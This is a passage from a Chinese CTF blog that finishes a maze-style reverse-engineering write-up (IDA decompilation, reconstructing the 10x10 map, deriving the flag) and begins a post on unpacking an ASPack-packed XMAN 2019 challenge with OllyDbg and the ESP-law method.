class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们不难分析出<code>a1</code>其实即为我们输入的<code>flag</code>，且<code>flag</code>的长度为<code>32</code>，然后一个<code>for</code>循环里面的<code>switch</code>语句，相当于我们输入的<code>flag</code>转换数据并存在<code>dword_405060</code>这个数组里面</p>
<p>然后我们看看<code>switch</code>函数的几个值，<code>97</code>，<code>100</code>，<code>119</code>，<code>115</code>是不是很像<code>ASCII</code>编码，我们把它通过<code>IDA</code>转换为<code>char</code>类型，然后重命名一些函数名称就成了下面的样子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">sub_401350</span><span class="params">(<span class="keyword">char</span> *flag)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(flag) != <span class="number">32</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strncmp</span>(flag, <span class="string">"flag&#123;"</span>, <span class="number">5</span>) || flag[<span class="number">31</span>] != <span class="number">125</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">switch</span> ( flag[i + <span class="number">5</span>] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'a'</span>:</span><br><span class="line">        save[i] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'d'</span>:</span><br><span class="line">        save[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'w'</span>:</span><br><span class="line">        save[i] = <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="string">'s'</span>:</span><br><span class="line">        save[i] = <span class="number">3</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>就直观很多了，等于说我们的<code>flag</code>仅限于<code>a</code>, <code>d</code>, <code>w</code>, <code>s</code>这四个字母，这就很像一道迷宫题的样子，我们继续分析<code>sub_40145A</code>这个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_40145A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v2; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">4</span>;</span><br><span class="line">  v2 = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 += dword_402068[save[i]];</span><br><span class="line">    v2 += dword_402078[save[i]];</span><br><span class="line">    <span class="keyword">if</span> ( v3 &gt; <span class="number">9</span> || v3 &lt; <span class="number">0</span> || v2 &gt; <span class="number">9</span> || v2 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( byte_402000[<span class="number">10</span> * v3 + v2] == <span class="number">35</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( byte_402000[<span class="number">10</span> * v3 + v2] == <span class="number">43</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们先分析一下<code>dword_402068</code>和<code>dword_402078</code>这两个数组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00402068</span> ; <span class="keyword">int</span> dword_402068[]</span><br><span class="line">.data:<span class="number">00402068</span> dword_402068    dd <span class="number">0</span>                    ; DATA XREF: sub_40145A+<span class="number">2</span>A↑r</span><br><span class="line">.data:<span class="number">0040206</span>C                 align <span class="number">10</span>h</span><br><span class="line">.data:<span class="number">00402070</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402071</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402072</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402073</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402074</span>                 db    <span class="number">1</span></span><br><span class="line">.data:<span class="number">00402075</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402076</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402077</span>                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>这里有个坑，其他数据都是以<code>db</code>类型保存，而第一个为<code>dd</code>格式，</p>
<p><code>db</code>定义字节类型变量，一个字节数据占<code>1</code>个字节单元，读完一个，偏移量加<code>1</code></p>
<p><code>dw</code>定义字类型变量，一个字数据占<code>2</code>个字节单元，读完一个，偏移量加<code>2</code></p>
<p><code>dd</code>定义双字类型变量，一个双字数据占<code>4</code>个字节单元，读完一个，偏移量加<code>4</code></p>
<p>在<code>IDA</code>里面我们可以通过<code>D</code>键更改数据的类型，可以变为这样</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="number">00402068</span> ; <span class="keyword">int</span> byte_402068[]</span><br><span class="line">.data:<span class="number">00402068</span> byte_402068     db <span class="number">0</span>                    ; DATA XREF: sub_40145A+<span class="number">2</span>A↑r</span><br><span class="line">.data:<span class="number">00402069</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206</span>A                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206B</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206</span>C                 db <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206</span>D                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206</span>E                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040206F</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402070</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402071</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402072</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402073</span>                 db <span class="number">0F</span>Fh</span><br><span class="line">.data:<span class="number">00402074</span>                 db    <span class="number">1</span></span><br><span class="line">.data:<span class="number">00402075</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402076</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402077</span>                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>不难看出其实保存的数据就是十六进制下的<code>0</code>，<code>0</code>，<code>-1</code>，<code>1</code>，之前的align就是为了对齐内存数据，从内存数据也可以看出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00402060</span>  <span class="number">2</span>E <span class="number">2</span>E <span class="number">23</span> <span class="number">23</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">00402070</span>  FF FF FF FF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>  FF FF FF FF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p><code>dword_402068</code>的内存地址位<code>0x00402068</code>到<code>0x00402077</code>，即为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> FF FF FF FF <span class="number">01</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>

<p>现在我们来关注<code>dword_402078</code>这个数组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">data:<span class="number">00402078</span> dword_402078    dd <span class="number">0F</span>FFFFFFFh           ; DATA XREF: sub_40145A+<span class="number">3</span>E↑r</span><br><span class="line">.data:<span class="number">0040207</span>C                 db    <span class="number">1</span></span><br><span class="line">.data:<span class="number">0040207</span>D                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040207</span>E                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040207F</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402080</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402081</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402082</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402083</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402084</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402085</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402086</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402087</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402088</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402089</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208</span>A                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208B</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208</span>C                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208</span>D                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208</span>E                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040208F</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402090</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402091</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402092</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402093</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402094</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402095</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402096</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402097</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402098</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">00402099</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209</span>A                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209B</span>                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209</span>C                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209</span>D                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209</span>E                 db    <span class="number">0</span></span><br><span class="line">.data:<span class="number">0040209F</span>                 db    <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>在<code>IDA</code>里面我们可以选中需要导出数据的内存区域，然后按<code>shift+E</code>的快捷键就可以选择各种导出格式方便导出，我们直接选择导出为数组</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> ida_chars[] =</span><br><span class="line">&#123;</span><br><span class="line">  <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">  <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这两个数组也就是改变<code>v3</code>和<code>v2</code>的值，也不太能方便的得知程序的真实意图，我们再看看<code>byte_402000</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.data:<span class="number">00402000</span> byte_402000     db <span class="number">23</span>h                  ; DATA XREF: sub_40145A+<span class="number">7</span>A↑r</span><br><span class="line">.data:<span class="number">00402000</span>                                         ; sub_40145A+<span class="number">9F</span>↑r</span><br><span class="line">.data:00402001                 db '#....######.##.###.##.##.###....##.###..####......####.#.##.####.'</span><br><span class="line">.data:00402001                 db '..##....#########.###+#####.....##',0</span><br><span class="line">.data:<span class="number">00402065</span>                 align <span class="number">4</span></span><br></pre></td></tr></table></figure>

<p>这就是迷宫的地图啊，然后这里有个坑，其实第一个<code>23h</code>也是地图的一部分，也就是<code>#</code>，我们不难得出地图的字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#....######.##.###.##.##.###....##.###..####......####.#.##.####...##....#########.###+#####.....##</span><br></pre></td></tr></table></figure>

<p>所以这是个怎么样的二维地图呢，我们回到函数看到这些代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v3 &gt; <span class="number">9</span> || v3 &lt; <span class="number">0</span> || v2 &gt; <span class="number">9</span> || v2 &lt; <span class="number">0</span> )</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span> ( byte_402000[<span class="number">10</span> * v3 + v2] == <span class="number">35</span> )</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">if</span> ( byte_402000[<span class="number">10</span> * v3 + v2] == <span class="number">43</span> )</span><br><span class="line">     <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p><code>[10 * v3 + v2]</code>就是一个模拟二维数组的方式，根据<code>v3 &gt; 9 || v3 &lt; 0 || v2 &gt; 9 || v2 &lt; 0</code>也可以得出这是一个按照<code>10 x 10</code> 排列的地图</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">##....####</span><br><span class="line">##.##.###.</span><br><span class="line">##.##.###.</span><br><span class="line">...##.###.</span><br><span class="line">.####.....</span><br><span class="line">.####.#.##</span><br><span class="line">.####...##</span><br><span class="line">....######</span><br><span class="line">###.###+##</span><br><span class="line">###.....##</span><br></pre></td></tr></table></figure>

<p><code>v3</code>就是行数，<code>v2</code>就是列数,<code>v3</code>和<code>v2</code>的初始值就是起点，然后根据</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( byte_402000[<span class="number">10</span> * v3 + v2] == <span class="number">43</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br></pre></td></tr></table></figure>

<p>不难得出终点就是<code>+</code>，起点就是二维数组的<code>[4,5]</code>，也就是第五行第六列，我们用其他符号标出起点</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">##....####</span><br><span class="line">##.##.###.</span><br><span class="line">##.##.###.</span><br><span class="line">...##.###.</span><br><span class="line">.####<span class="number">0.</span>...</span><br><span class="line">.####.#.##</span><br><span class="line">.####...##</span><br><span class="line">....######</span><br><span class="line">###.###+##</span><br><span class="line">###.....##</span><br></pre></td></tr></table></figure>

<p>则函数的修复代码应该为</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> <span class="keyword">int</span> <span class="title">sub_40145A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [esp+4h] [ebp-Ch]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> line; <span class="comment">// [esp+8h] [ebp-8h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> row; <span class="comment">// [esp+Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  row = <span class="number">4</span>;</span><br><span class="line">  line = <span class="number">5</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">25</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    row += s1[save[i]];</span><br><span class="line">    line += s2[save[i]];</span><br><span class="line">    <span class="keyword">if</span> ( row &gt; <span class="number">9</span> || row &lt; <span class="number">0</span> || line &gt; <span class="number">9</span> || line &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">10</span> * row + line] == <span class="number">35</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">map</span>[<span class="number">10</span> * row + line] == <span class="number">43</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>不难得出<code>flag</code>，即为以<code>a</code>, <code>w</code>, <code>s</code>, <code>d</code>为方向键走出迷宫的路径</p>
<p><code>flag{wwwwaaaasssaassssdddssddddw}</code></p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/08/XMAN-2019-╕ú╓▌-Re-reverse2-final/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/08/08/XMAN-2019-╕ú╓▌-Re-reverse2-final/" class="post-title-link" itemprop="url">XMAN-2019-福州-Re-reverse2_final</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-08-08 09:15:24" itemprop="dateCreated datePublished" datetime="2019-08-08T09:15:24-07:00">2019-08-08</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-08-09 00:15:44" itemprop="dateModified" datetime="2019-08-09T00:15:44-07:00">2019-08-09</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>终于学会如何手动脱ASPack类型的壳了。“壳”就是专门压缩或加密的工具，通过在压缩、加密的过程中加入保护性代码，程序文件会失去原来的程序结构，改变代码的表。现形式，增加被篡改和反编译的难度，达到保护程序内部逻辑的效果。</p>
<p>壳主要有压缩壳和加密壳两种</p>
<p>压缩壳</p>
<p>以减小软件体积和改变软件可执行代码的特征为目的压缩壳的主要目的对程序进行压缩，对程序的保护不是该类壳的重点。主要有<strong>ASPack</strong>、<strong>UPX</strong>和<strong>PECompact</strong>等。此题即为<strong>ASPack</strong>类型的壳。</p>
<p>加密壳</p>
<p>以保护软件为目的，根据用户输入的密码用相应的加密算法对原程序进行加密。主要有<strong>ASProtect</strong>、<strong>Armadillo</strong>、<strong>EXECryptor</strong>以及<strong>Themida</strong>等。</p>
<p>由于近年来CTF比赛中带壳的逆向题出现频率稍有增加，在静态分析之前，进行查壳是非常有必要的，常用的工具有PEID等，进行查壳后，如果是简单且常见的壳如UPX等，那么直接可以使用工具完成脱壳，如果一时半会找不到可用的工具，也可以尝试手工脱壳，例如ASPack就能够采用ESP定律来脱除。如果是侧重考察脱壳的题，一般程序本身就比较简单了，可以这样说，这类题如果能成功脱壳，基本上也算是做出来了。</p>
<p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p>
<h2 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h2><p>首先我们尝试用IDA Pro直接打开这个可执行文件</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%887.11.04.png" alt></p>
<p>IDA Pro只出现了<code>start</code>函数，且可以发现出现了很多奇怪的数据可以考虑是不是一个带壳的文件，我们使用工具<strong>PEID</strong>不难查出这就是一个<strong>ASPack</strong>类型的壳</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%887.19.45.png" alt></p>
<p>然后我们把程序拖进OllyDbg进行动态调试</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.01.35.png" alt></p>
<p>可以看到很明显的加壳代码逻辑<code>pushad</code>指令将当前所有寄存器的数据压入栈中，保存现场，当壳程序执行完毕后恢复主程序，这里涉及到一个<strong>ESP</strong>定律</p>
<p><strong>ESP</strong>定律——栈平衡原理</p>
<ol>
<li><ul>
<li>▉  加壳软件，必须保证外壳初始化的现场环境(寄存器)与原程序的现场环境相同</li>
<li>▉  加壳程序初始化时保存各寄存器的值，外壳执行完毕，再恢复各寄存器内容，最后再跳到原程序执行</li>
<li>▉  程序通常使用 <strong>pushad/popad</strong>、<strong>pushfd/popfd</strong> 指令来保存与恢复现场环境</li>
</ul>
</li>
</ol>
<p>所以我们只需要按下F7查看右边寄存器窗口ESP的值，选中右键数据窗口中跟随然后进行下硬件断点</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.01.47.png" alt></p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.02.11.png" alt></p>
<p>然后在按下<strong>F9</strong>运行程序，程序会在断点处停下就会看到</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.00.43.png" alt></p>
<p>上面有<code>JNZ</code>意思是不等于0就跳转，还看到<code>PUSH</code> 意思是压入一个地址然后在<code>RETN</code>返回，因为是停在<code>JNZ</code>上箭头显示为红色(红色代表跳转已经实现) ，就直接<code>F7</code>直到跳到正确的入口地址</p>
<p><img src="https://github-1251836300.cos.ap-guangzhou.myqcloud.com/XMAN-2019-FZU/%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A7%202019-08-08%20%E4%B8%8B%E5%8D%884.01.12.png" alt></p>
